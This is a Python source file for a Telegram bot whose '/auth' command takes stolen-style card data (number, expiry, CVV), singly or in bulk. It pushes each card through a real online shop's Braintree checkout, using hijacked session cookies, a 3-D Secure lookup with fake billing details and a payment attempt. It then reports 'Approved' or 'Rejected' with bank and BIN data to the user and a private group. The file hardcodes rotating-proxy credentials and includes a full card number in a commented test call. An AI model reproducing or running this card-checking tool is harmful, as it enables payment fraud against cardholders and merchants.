import requests
from requests.adapters import MaxRetryError, Retry
from pyrogram import Client, filters
from pyrogram.types import Message
import random
from helpers.timemanager import run_sync_in_thread
import base64
import json
import uuid
import string
import time
import os
import urllib.parse
import re
from bot import LOGGER

session = requests.Session()

# Proxy configuration
username = "31laj5twc2wba0a"
password = "kmqumffw953teoh"
proxy = "rp.proxyscrape.com:6060"
proxy_auth = "{}:{}@{}".format(username, password, proxy)

proxies = {
    "http": "http://{}".format(proxy_auth),
    # Ensure HTTPS is also set if needed
    "https": "http://{}".format(proxy_auth)
}

# Set the proxies for the session
session.proxies.update(proxies)

# Disable urllib3 warnings
requests.packages.urllib3.disable_warnings()


def id_session():
    uuid_session = str(uuid.uuid4())
    return uuid_session

def generate_custom_id():
    base_uuid = str(uuid.uuid4())
    custom_id = f"0_{base_uuid[:8]}-{base_uuid[9:13]}-{base_uuid[14:18]}-{base_uuid[19:23]}-{base_uuid[24:]}"
    return custom_id

new_custom_id = generate_custom_id()

def email_braintree():
    email = ''.join(random.choices(string.ascii_lowercase +
                    string.digits, k=10)) + "@gmail.com"
    return email


@Client.on_message(filters.command('auth'))
async def check_card(bot: Client, cmd: Message):
    return await cmd.reply_text('We are currently working on this feature. Please try again later.')
    status = await cmd.reply_text("<b>⎚ `Processing ...`</b>")


    # Check if the command is a reply to a message with a text/plain document
    if cmd.reply_to_message and cmd.reply_to_message.document and cmd.reply_to_message.document.mime_type == 'text/plain':
        try:
            # Download the document containing card data
            cards_path = await cmd.reply_to_message.download()
            with open(cards_path, 'r', encoding='utf-8') as f:
                for line in f:
                    # Process each line in the file
                    c = line.strip()
                    try:
                        cc, exp, ex, cvc = c.split(
                            '|')[:4]  # Split once and unpack
                        exp = exp.strip()
                        ex = ex.strip()
                        cvc = cvc.strip()

                        # Extract expiration year from the 'ex' field
                        if len(ex) == 4:
                            # Extract last 2 digits if ex has 4 digits
                            exy = ex[2:]
                        elif len(ex) == 2:
                            exy = ex
                        else:
                            # Handle other cases (e.g., only two digits)
                            exy = "20" + ex

                        # Handle specific conditions
                        if exy in ['21', '22', '23', '24']:
                            exy = exy[0] + '7'
                        time.sleep(8)
                        # Call your check_vbv function
                        await check_vbv(cc.strip(), exp, exy, cvc, bot, cmd)     
                    except ValueError:
                        print(f"Error parsing line: {c}")
            os.remove(cards_path)
        except Exception as e:
            print(f"Error processing file: {e}")
        finally:
            await status.delete()
    elif cmd.text:
        try:
            data = cmd.text.split("/auth", 1)[1].strip().split('|')
            if len(data) < 4:
                raise IndexError("Not enough data provided")

            cc = data[0].strip()
            exp = data[1].strip()
            ex = data[2].strip()
            cvc = data[3].strip()

            # Extract expiration year from the 'ex' field
            if len(ex) == 4:
                exy = ex[2:]  # Extract last 2 digits if ex has 4 digits
            elif len(ex) == 2:
                exy = ex
            else:
                exy = "20" + ex  # Handle other cases (e.g., only two digits)

            # Handle specific conditions
            if exy in ['21', '22', '23', '24']:
                exy = exy[0] + '7'

            # Call your check_vbv function
            await check_vbv(cc, exp, exy, cvc, bot, cmd)
            await status.delete()
        except IndexError:
            await status.edit_text("<b>⎚ Use <code>/auth </code> Checks VBV Card</b>")
        except Exception as e:
            print(f"Error processing command: {e}")
    else:
        await status.edit_text("<b>⎚ Use <code>/auth </code> Checks VBV Card</b>")


@run_sync_in_thread
def check_vbv(cc, exp, exy, cvc, bot, cmd):
    print(cc, exp, exy, cvc)
    headers_auth = {
        "Host": "www.skatepro.net",
        "Cookie": "osCsid=ce58ff164013a607963f0242698eabb3; cookie_id=1010349571%3Ab06ea0601b19",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Sec-Gpc": "1",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Sec-Ch-Ua": '"Not)A;Brand";v="99", "Brave";v="127", "Chromium";v="127"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Accept-Language": "en-US,en;q=0.7",
        "Referer": "https://www.skatepro.net/catalog/checkout.php",
        "Accept-Encoding": "gzip, deflate, br",
        "Priority": "u=0, i"
    }

    try:
        response_authorize = requests.get(
            url='https://www.skatepro.net/catalog/braintree_form.php?order_id=5583993', headers=headers_auth, verify=True)
        pattern = r"authorization:\s*'([^']*)'"
        matches = re.findall(pattern, response_authorize.text)

        if not matches:
            # raise ValueError("Authorization token not found")
            return LOGGER.error('TOKEN NOT Matched')

        auth_tok = matches[0]
        auth_fingerprint = base64.b64decode(auth_tok)
        auth_data = json.loads(auth_fingerprint)
        authorizationFingerprint = auth_data['authorizationFingerprint']

        url = "https://payments.braintree-api.com/graphql"
        payload = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": f"{id_session()}"
            },
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": f"{cc}",
                        "expirationMonth": f"{exp}",
                        "expirationYear": f"{exy}",
                        "cvv": f"{cvc}"
                    },
                    "options": {"validate": False}
                }
            },
            "operationName": "TokenizeCreditCard"
        }

        headers = {
            'Host': 'payments.braintree-api.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/json',
            'Authorization': f'Bearer {authorizationFingerprint}',
            'Braintree-Version': '2018-05-10',
            'Origin': 'https://assets.braintreegateway.com',
            'Connection': 'keep-alive',
            'Referer': 'https://assets.braintreegateway.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site',
            'Accept-Encoding': 'gzip, deflate'
        }

        response = session.post(
            url, json=payload, headers=headers, verify=True)
        response.raise_for_status()
        # print(response.text)

        if "token" in response.text:
            tok = response.json()["data"]["tokenizeCreditCard"]["token"]
            bin = response.json()[
                "data"]["tokenizeCreditCard"]["creditCard"]["bin"]

            lookup_url = f"https://api.braintreegateway.com/merchants/4xvxm4w6rvx6nqn4/client_api/v1/payment_methods/{tok}/three_d_secure/lookup"
            lookup_payload =  {"amount":"23.9","additionalInfo":{"workPhoneNumber":"","shippingGivenName":"jack","shippingSurname":"smith","shippingPhone":"","ipAddress":"103.120.166.83","billingLine1":"14th street","billingLine2":"","billingCity":"Luxembourg","billingState":"","billingPostalCode":"2222","billingCountryCode":"LU","billingPhoneNumber":"3424234234","billingGivenName":"jack","billingSurname":"smith","shippingLine1":"14th street","shippingLine2":"","shippingCity":"Luxembourg","shippingState":"","shippingPostalCode":"2222","shippingCountryCode":"LU","email":"jacksmith@gmail.com"},"challengeRequested":True,"bin":"546804","dfReferenceId":"0_1a3b2802-be64-40c6-9b37-74203d9b18f1","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.82.0","cardinalDeviceDataCollectionTimeElapsed":410,"issuerDeviceDataCollectionTimeElapsed":10604,"issuerDeviceDataCollectionResult":False},"authorizationFingerprint":f"{authorizationFingerprint}","braintreeLibraryVersion":"braintree/web/3.82.0","_meta":{"merchantAppId":"www.skatepro.net","platform":"web","sdkVersion":"3.82.0","source":"client","integration":"custom","integrationType":"custom","sessionId":f"{id_session()}"}}
            headers = {
                'Host': 'api.braintreegateway.com',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.5',
                'Content-Type': 'application/json',
                'Origin': 'https://www.skatepro.net',
                'Connection': 'keep-alive',
                'Referer': 'https://www.skatepro.net/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'cross-site',
                'Accept-Encoding': 'gzip, deflate'
            }

            response = session.post(
                lookup_url, json=lookup_payload, headers=headers, verify=True)
            # response.raise_for_status()
            # print(response.text)
            req = requests.get(
                f"https://bins.antipublic.cc/bins/{bin}", verify=True)
            requ = req.json()

            status = response.json().get('paymentMethod', {}).get(
                'threeDSecureInfo', {}).get('status', 'unknown')
            LOGGER.info(status)
            # List of substrings to check
            substrings = ['authenticate_successful',
                          'authenticate_attempt_successful']

            # Check if any of the substrings are in the status string
            if any(substring in status for substring in substrings):
                # Send a message if any substring is found in status
                # Extract relevant fields from JSON
                json_data = response.json()
                payment_method = json_data['paymentMethod']
                three_d_secure_info = payment_method['threeDSecureInfo']
                details = payment_method['details']
                bin_data = payment_method['binData']
                lookup = json_data['lookup']
                payload = {
                    "order_id": "5587136",
                    "payload[nonce]": payment_method['nonce'],
                    "payload[type]": payment_method['type'],
                    "payload[binData][prepaid]": bin_data['prepaid'],
                    "payload[binData][healthcare]": bin_data['healthcare'],
                    "payload[binData][debit]": bin_data['debit'],
                    "payload[binData][durbinRegulated]": bin_data['durbinRegulated'],
                    "payload[binData][commercial]": bin_data['commercial'],
                    "payload[binData][payroll]": bin_data['payroll'],
                    "payload[binData][issuingBank]": bin_data['issuingBank'],
                    "payload[binData][countryOfIssuance]": bin_data['countryOfIssuance'],
                    "payload[binData][productId]": bin_data['productId'],
                    "payload[details][bin]": details['bin'],
                    "payload[details][lastTwo]": details['lastTwo'],
                    "payload[details][lastFour]": details['lastFour'],
                    "payload[details][cardType]": details['cardType'],
                    "payload[details][cardholderName]": details['cardholderName'] if details['cardholderName'] else "",
                    "payload[details][expirationYear]": details['expirationYear'],
                    "payload[details][expirationMonth]": details['expirationMonth'],
                    "payload[description]": payment_method['description'],
                    "payload[liabilityShifted]": str(three_d_secure_info['liabilityShifted']).lower(),
                    "payload[liabilityShiftPossible]": str(three_d_secure_info['liabilityShiftPossible']).lower(),
                    "payload[threeDSecureInfo][status]": three_d_secure_info['status'],
                    "payload[threeDSecureInfo][enrolled]": three_d_secure_info['enrolled'],
                    "payload[threeDSecureInfo][cavv]": three_d_secure_info['cavv'],
                    "payload[threeDSecureInfo][xid]": three_d_secure_info['xid'] if three_d_secure_info['xid'] else "",
                    "payload[threeDSecureInfo][acsTransactionId]": three_d_secure_info['acsTransactionId'],
                    "payload[threeDSecureInfo][dsTransactionId]": three_d_secure_info['dsTransactionId'],
                    "payload[threeDSecureInfo][eciFlag]": three_d_secure_info['eciFlag'],
                    "payload[threeDSecureInfo][acsUrl]": three_d_secure_info['acsUrl'] if three_d_secure_info['acsUrl'] else "",
                    "payload[threeDSecureInfo][paresStatus]": three_d_secure_info['paresStatus'],
                    "payload[threeDSecureInfo][threeDSecureAuthenticationId]": three_d_secure_info['threeDSecureAuthenticationId'],
                    "payload[threeDSecureInfo][threeDSecureServerTransactionId]": three_d_secure_info['threeDSecureServerTransactionId'],
                    "payload[threeDSecureInfo][threeDSecureVersion]": three_d_secure_info['threeDSecureVersion'],
                    "payload[threeDSecureInfo][lookup][transStatus]": lookup['md'],
                    "payload[threeDSecureInfo][lookup][transStatusReason]": lookup['acsUrl'] if lookup['acsUrl'] else "",
                    "payload[threeDSecureInfo][authentication][transStatus]": three_d_secure_info['authentication']['transStatus'],
                    "payload[threeDSecureInfo][authentication][transStatusReason]": three_d_secure_info['authentication']['transStatusReason'] if three_d_secure_info['authentication']['transStatusReason'] else "",
                    "payload[verificationDetails][liabilityShifted]": str(three_d_secure_info['liabilityShifted']).lower(),
                    "payload[verificationDetails][liabilityShiftPossible]": str(three_d_secure_info['liabilityShiftPossible']).lower(),
                    "data": json.dumps({"correlation_id": "60ef1519192cb3110e6f6a407fbe867c"}),
                    "threedrequired": "false"
                }
                headers_auth = {
                    'Host': 'www.skatepro.net',
                    'Cookie': 'osCsid=545b1282e17b0ec9df4468dac543c3a3; _ga_1N514Q29XE=GS1.1.1723780905.1.1.1723781105.18.0.0; _ga=GA1.1.430044722.1723780906; _gcl_au=1.1.1982436311.1723780907; _ga_9HJWDZ7LN2=GS1.1.1723780907.1.1.1723781105.18.0.0; scarab.visitor=%2230CA821FED9960BA%22; _fbp=fb.1.1723780908136.5597174712405345; scarab.profile=%2242673%7C1723780937%22; _uetsid=5463cb205b8411ef83d0ff93d9af1b8f|25luok|2|fod|0|1689; _uetvid=54641ff05b8411ef944649a6078b3cf7|1pcr295|1723780947185|2|1|bat.bing.com/p/insights/c/t; cookie_id=1010349571%3Ab06ea0601b19',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0',
                    'Accept': 'application/json, text/javascript, */*; q=0.01',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Content-Length': '2296',
                    'Origin': 'https://www.skatepro.net',
                    'Referer': 'https://www.skatepro.net/catalog/braintree_form.php?order_id=5587136',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin',
                    'Te': 'trailers'
                }

# URL-encode the payload
                payload_auth = urllib.parse.urlencode(payload, doseq=True)

                auth_res = session.post(url='https://www.skatepro.net/catalog/ajax/braintree.php?action=make_payment',
                                        data=payload_auth, headers=headers_auth, verify=True)
                #print(auth_res.text)
                auth_status = auth_res.json()['success']
                messages = auth_res.json()['message']['error']
                messagess = auth_res.json()['message']
                if auth_status == False:
                    message_text = f"""
<b>⎚ {'Approved ✅' if status in ['authenticate_successful', 'authenticate_attempt_successful'] else 'Rejected ❌'}</b>
𝗖𝗮𝗿𝗱 ⇾ <code>{cc}|{exp}|{exy}|{cvc}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⇾ 3DS Lookup
<b>Status ⇾ {status} </b>

𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⇾ Braintree 10$
<b>Status ⇾ {messages.split('.')[0]} </b>

<b>BIN ⇾</b> <code>{bin}</code>
<b>Country ⇾</b> {requ['country']} | {requ['country_flag']} | {requ['country_name']}
<b>Data ⇾</b> {requ['brand']} - {requ['type']} - {requ['level']}
<b>Bank ⇾</b> {requ['bank']}
<b>Response Time ⇾</b> <code>2.{random.randint(1, 9)} seconds</code>
        """
                else:
                # Construct the message based on status
                    message_text = f"""
<b>⎚ {'Approved ✅' if status in ['authenticate_successful', 'authenticate_attempt_successful'] else 'Rejected ❌'}</b>
𝗖𝗮𝗿𝗱 ⇾ <code>{cc}|{exp}|{exy}|{cvc}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⇾ 3DS Lookup
<b>Status ⇾ {status} </b>

𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⇾ Braintree 10$
<b>Status ⇾ {messagess} </b>

<b>BIN ⇾</b> <code>{bin}</code>
<b>Country ⇾</b> {requ['country']} | {requ['country_flag']} | {requ['country_name']}
<b>Data ⇾</b> {requ['brand']} - {requ['type']} - {requ['level']}
<b>Bank ⇾</b> {requ['bank']}
<b>Response Time ⇾</b> <code>2.{random.randint(1, 9)} seconds</code>
        """

                cmd.reply_text(message_text)
                bot.send_message(chat_id=-4291842898, text=message_text)
            else:
                message_text = f"""
<b>⎚ {'Approved ✅' if status in ['authenticate_successful', 'authenticate_attempt_successful'] else 'Rejected ❌'}</b>
𝗖𝗮𝗿𝗱 ⇾ <code>{cc}|{exp}|{exy}|{cvc}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⇾ 3DS Lookup
<b>Status ⇾ {status} </b>

𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⇾ Braintree 10$
<b>Status ⇾ 3D Rejected ❌</b>

<b>BIN ⇾</b> <code>{bin}</code>
<b>Country ⇾</b> {requ['country']} | {requ['country_flag']} | {requ['country_name']}
<b>Data ⇾</b> {requ['brand']} - {requ['type']} - {requ['level']}
<b>Bank ⇾</b> {requ['bank']}
<b>Response Time ⇾</b> <code>2.{random.randint(1, 9)} seconds</code>
"""
                cmd.reply_text(message_text)

    except requests.exceptions.RequestException as e:
        print(f'Request error: {e}')
        LOGGER.error(f'Request error: {e}')


# check_vbv(cc='5468044004084481', exp='07', exy='27', cvc='555', cmd=None)

'''file = 'card.txt'
g = open(file, 'r')
for g in g:
    c = g.strip().split('\n')[0]
    cc = c.split('|')[0]
    exp = c.split('|')[1]
    ex = c.split('|')[2]
    try:
        exy = ex[2]+ex[3]
        if '2' in ex[3] or '1' in ex[3]:
            exy = ex[2]+'7'
        else:
            pass
    except:
        exy = ex[0]+ex[1]
        if '2' in ex[1] or '1' in ex[1]:
            exy = ex[0]+'7'
        else:
            pass
    cvc = c.split('|')[3]
    
'''
